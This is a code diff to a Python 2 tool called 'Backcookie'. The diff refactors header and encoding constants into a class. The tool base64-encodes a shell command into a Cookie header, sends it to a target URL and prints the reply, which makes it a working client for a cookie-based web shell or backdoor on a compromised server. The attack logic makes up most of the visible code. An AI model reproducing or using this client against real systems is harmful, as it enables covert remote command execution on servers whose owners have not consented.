@@ -35,26 +35,33 @@ else:
 
 # Name of the cookie
 cookie = "1"
-bc = "Backcookie"
 
-# Colors
+# colors
 class color:
     azul = '\033[94m'
     rojo = '\033[91m'
     verde = '\033[92m'
     blanco = '\033[0m'
 
+# class of header and encode
+class core:
+    bc = 'Backcookie'
+    ua = 'User-Agent'
+    ck = 'Cookie'
+    vc = '={0}'
+    eb = 'base64'
+
 def backcookie(c, a, debugLevel=0): # c is command & a is agent
     o = build_opener(HTTPHandler(debuglevel=debugLevel))
     o.addheaders = [
-        ('User-Agent', a),
-        ('Cookie', cookie + '={0}'.format(c.encode('base64')))
+        (core.ua, a),
+        (core.ck, cookie + core.vc.format(c.encode(core.eb)))
     ]
     l = o.open(argv[1])
     print color.azul + l.read().strip() + color.blanco
 
 def main():
-    print color.blanco + "\t\t-------------" + color.rojo + bc + color.blanco + "------------"
+    print color.blanco + "\t\t-------------" + color.rojo + core.bc + color.blanco + "------------"
     print "\t\t+    Developed by: @mrjopino      +"
     print "\t\t+             To play             +"
     print "\t\t-----------------------------------\n\n"
@@ -83,7 +90,7 @@ def main():
             print "\t\t+       Security researcher      +"
             print "\t\t+            @mrjopino           +"
             print "\t\t----------------------------------\n\n"
-            print color.azul + "[-] " + color.rojo + bc + " OFF\n" + color.blanco
+            print color.azul + "[-] " + color.rojo + core.bc + " OFF\n" + color.blanco
             break
 
 if __name__ == "__main__":
